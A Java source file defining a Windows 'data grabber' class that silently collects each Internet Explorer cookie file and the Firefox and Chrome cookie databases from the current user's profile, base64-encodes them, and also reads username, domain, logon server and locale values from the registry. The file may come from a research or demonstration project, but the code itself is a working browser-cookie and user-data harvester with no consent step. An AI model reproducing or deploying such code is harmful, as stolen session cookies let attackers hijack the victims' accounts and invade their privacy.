package com.googlecode.righettod.cip;

import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;

import javax.xml.bind.DatatypeConverter;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.googlecode.righettod.cip.type.InformationSource;
import com.googlecode.righettod.cip.util.WindowsRegistry;
import com.googlecode.righettod.cip.vo.ClientInformation;

/**
 * Data grabber specialization for Windows OS.
 * 
 * @author Dominique Righetto (dominique.righetto@gmail.com)
 * 
 */
public class WindowsDataGrabber extends DataGrabber {

	/** LOGGER */
	private static final Logger LOG = LoggerFactory.getLogger(WindowsDataGrabber.class);

	/** Cached flag in order to know if current version of Windows is above XP or not */
	private boolean isAboveXPVersionCache = false;

	/**
	 * 
	 * Constructor
	 * 
	 */
	public WindowsDataGrabber() {
		String version = System.getProperty("os.name", "");
		switch (version.toLowerCase()) {
		case "windows xp":
		case "windows 2003":
		case "windows 2000":
		case "windows nt":
		case "windows 98":
		case "windows me": {
			this.isAboveXPVersionCache = false;
			break;
		}
		default: {
			this.isAboveXPVersionCache = true;
			break;
		}
		}
	}

	/**
	 * {@inheritDoc}
	 * 
	 * @see com.googlecode.righettod.cip.DataGrabber#grabFromFileSystem()
	 */
	@Override
	public List<ClientInformation> grabFromFileSystem() {
		final List<ClientInformation> data = new ArrayList<>();
		String path = null;

		try {
			/* Grab Internet Explorer cookies (each files) */
			// Determine location
			if (this.isAboveXPVersionCache) {
				// Vista and above
				path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Cookies";
			} else {
				// XP and below
				path = "C:\\Documents and Settings\\%s\\Local Settings\\Temporary Internet Files";
			}
			// Parse recursively storage location
			Files.walkFileTree(Paths.get(String.format(path, System.getenv("USERNAME"))), new SimpleFileVisitor<Path>() {

				@Override
				public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
					if (attrs.isRegularFile()) {
						byte[] content = Files.readAllBytes(file);
						data.add(new ClientInformation(InformationSource.IE_COOKIES, DatatypeConverter.printBase64Binary(content)));
					}
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFileFailed(Path file, IOException e) {
					// Ignore error
					return FileVisitResult.CONTINUE;
				}
			});

			/* Grab Firefox cookies (SQLLite DB file) */
			// Determine location
			if (this.isAboveXPVersionCache) {
				// Vista and above
				path = "C:\\Users\\%s\\AppData\\Local\\Mozilla\\Firefox\\Profiles";
			} else {
				// XP and below
				path = "C:\\Documents and Settings\\%s\\Application Data\\Mozilla\\Firefox\\Profiles";
			}
			// Parse recursively storage location (get cookies for all profiles)
			Files.walkFileTree(Paths.get(String.format(path, System.getenv("USERNAME"))), new SimpleFileVisitor<Path>() {

				@Override
				public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
					if ("cookies.sqlite".equalsIgnoreCase(file.getFileName().toString())) {
						byte[] content = Files.readAllBytes(file);
						data.add(new ClientInformation(InformationSource.FIREFOX_COOKIES, DatatypeConverter.printBase64Binary(content)));
					}
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFileFailed(Path file, IOException e) {
					// Ignore error
					return FileVisitResult.CONTINUE;
				}
			});

			/* Grab Chrome cookies (SQLLite DB file) */
			// Determine location
			if (this.isAboveXPVersionCache) {
				// Vista and above
				path = "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
			} else {
				// XP and below
				path = "C:\\Documents and Settings\\%s\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default";
			}
			// Parse recursively storage location
			Files.walkFileTree(Paths.get(String.format(path, System.getenv("USERNAME"))), new SimpleFileVisitor<Path>() {

				@Override
				public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
					if ("Cookies".equalsIgnoreCase(file.getFileName().toString())) {
						byte[] content = Files.readAllBytes(file);
						data.add(new ClientInformation(InformationSource.CHROME_COOKIES, DatatypeConverter.printBase64Binary(content)));
						return FileVisitResult.TERMINATE;
					}
					return FileVisitResult.CONTINUE;
				}

				@Override
				public FileVisitResult visitFileFailed(Path file, IOException e) {
					// Ignore error
					return FileVisitResult.CONTINUE;
				}
			});

		}
		catch (Exception e) {
			LOG.warn("Cannot parse directory {}", path, e);
		}

		return data;
	}

	/**
	 * {@inheritDoc} <br>
	 * Implementation philosophy: We read key as much as possible...
	 * 
	 * @see com.googlecode.righettod.cip.DataGrabber#grabFromRegistry()
	 */
	@Override
	public List<ClientInformation> grabFromRegistry() {
		List<ClientInformation> data = new ArrayList<>();
		List<String> valuesToRead = new ArrayList<>();
		String keyName = null;
		String keyValueName = null;
		String keyValue = null;
		String tpl = "RegKey[%s\\%s]=%s";

		try {
			/* Read volatile user environment infos */
			keyName = "Volatile Environment";
			valuesToRead.add("USERNAME");
			valuesToRead.add("USERDOMAIN");
			valuesToRead.add("LOGONSERVER");
			valuesToRead.add("HOMEPATH");
			for (String s : valuesToRead) {
				keyValueName = s;
				keyValue = WindowsRegistry.getKeySz(WindowsRegistry.HKEY_CURRENT_USER, keyName, keyValueName);
				data.add(new ClientInformation(InformationSource.WINDOWS_REGISTRY, String.format(tpl, keyName, keyValueName, defaultString(keyValue))));
			}

			/* Read user windows location infos */
			keyName = "Control Panel\\International\\Geo";
			keyValueName = "Nation";
			keyValue = WindowsRegistry.getKeySz(WindowsRegistry.HKEY_CURRENT_USER, keyName, keyValueName);
			data.add(new ClientInformation(InformationSource.WINDOWS_REGISTRY, String.format(tpl, keyName, keyValueName, defaultString(keyValue))));

			/* Read regional settings infos */
			keyName = "Control Panel\\International";
			valuesToRead.clear();
			valuesToRead.add("LocaleName");
			valuesToRead.add("sLanguage");
			valuesToRead.add("sCountry");
			valuesToRead.add("iCountry");
			for (String s : valuesToRead) {
				keyValueName = s;
				keyValue = WindowsRegistry.getKeySz(WindowsRegistry.HKEY_CURRENT_USER, keyName, keyValueName);
				data.add(new ClientInformation(InformationSource.WINDOWS_REGISTRY, String.format(tpl, keyName, keyValueName, defaultString(keyValue))));
			}
		}
		catch (Exception e) {
			LOG.warn("Cannot read Windows registry keyName:'{}' keyValueName:'{}'", keyName, defaultString(keyValueName), e);
		}

		return data;
	}

}
